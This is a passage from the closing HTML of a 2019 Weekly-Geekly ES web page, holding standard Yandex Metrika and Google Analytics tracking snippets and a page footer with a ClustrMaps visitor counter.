          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>